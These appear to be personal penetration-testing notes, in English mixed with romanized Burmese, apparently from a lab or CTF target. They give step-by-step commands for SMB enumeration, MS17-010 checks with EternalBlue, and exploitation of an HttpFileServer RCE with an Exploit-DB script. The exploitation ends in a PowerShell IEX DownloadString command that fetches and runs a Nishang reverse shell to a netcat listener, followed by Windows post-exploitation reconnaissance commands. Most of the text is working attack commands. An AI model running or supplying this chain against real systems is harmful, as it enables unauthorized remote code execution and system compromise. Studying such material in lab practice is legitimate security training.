
nmap 10.0.0.1 -sV -sC -oN result.txt

crackmapexec smb 10.0.0.1  -> smb enum cuzz i found smb ports was running 

crackmapexec smb 10.0.0.1 --shares   -> for file shares

crackmapexec smb 10.0.0.1 --users   -> for users

enum4linux  10.0.0.1    -> enum with every possible ways

nmap -p 445 --script=smb-vuln-ms17-010 -sV 10.0.0.1

nmap -p 445 --script=smb-vuln* -sV 10.0.0.1    -> all version ko search dar

metaspolit mar eternalblue net ya dal   => anti system user net ya twar dal

----

port 80 mar httpfiletransfer run nay dal (HFS  or Httpfileserver)

so we search with searchsploit -> we found vlun -> we copy it

searchsploit -m 49125   => copy like dar

python 49125.py 10.0.0.1 80 "whoami"     => script ko run lite dar  => but this command is'nt work

python 49125.py 10.0.0.1 80 "cmd.exe /c ping 10.0.0.17"    => ping server from our local machine  => with full path  

tcpdump -i eth0 icmp    => eth0 ka network card  -> ping request ko phan dar



python 49125.py 10.0.0.1 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping 10.0.1.1"    => ping again with powershell



https://raw.githubusercontent.com/thawkhant/nishang_powershell/master/Shells/Invoke-PowerShellTcp.ps1  => power shell reverse shell 

 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444  -> i have to change this  => i replace this one at the end of this script

d file ko ho phint server ko pot mal 

pyton3 -m httpserver  => server htong

nc -lvp 444  -> reverse shell chake phot port ko pyaw dar

pee yin script ko run lite daw

python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1:8000/shell.ps1');"

Dmmm!! man i got shell access.

------

net user   => system mar user bal na yout shi lal kyi dar

net user thawkhant  -> administrator lr user lr check dar

net localgroup 'administrator'    -> administrator group mar bal thu dwe par lal paw

whoami /priv     => privilages escellation loke phot kyi dar

cd C:\   => c out ko twar dar

cd Users   => user htal go twar dal

systeminfo      -> system ko check dar

netstat -ano    => bal port twe open nay lal kyi dar


